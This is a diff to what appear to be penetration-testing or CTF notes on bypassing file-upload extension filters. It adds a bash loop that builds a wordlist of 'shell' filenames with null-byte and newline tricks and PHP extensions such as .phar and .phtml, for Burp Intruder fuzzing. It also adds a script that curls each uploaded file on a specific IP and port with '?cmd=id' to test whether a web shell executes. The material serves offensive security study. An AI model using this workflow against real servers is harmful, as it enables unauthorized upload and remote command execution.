@@ -36,7 +36,7 @@ These characters may end the file name after the character, passing the whitelis
 Bash script to generate all permutations of the file name:
 ```bash
 for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
-    for ext in '.php' '.phps'; do
+    for ext in '.php' '.phps' '.phar' '.phtml'; do
         echo "shell$char$ext.jpg" >> wordlist.txt
         echo "shell$ext$char.jpg" >> wordlist.txt
         echo "shell.jpg$char$ext" >> wordlist.txt
@@ -47,3 +47,17 @@ done
 - With this, we can run Burp Intruder fuzzing
 
 **Remember: uncheck URL Encode in Burp Intruder!!!!!
+
+Bash script to check if php code was executed:
+```bash
+#!/bin/bash
+#usage: supply your filename wordlist with the execution of this script. It replaces each line with $line 
+#./repeat.sh wordlist.txt
+
+input=$1
+while IFS= read -r line
+do
+        echo 'doing' $line':'
+        curl -I http://139.59.171.86:32638/profile_images/$line?cmd=id
+done < "$input"
+```
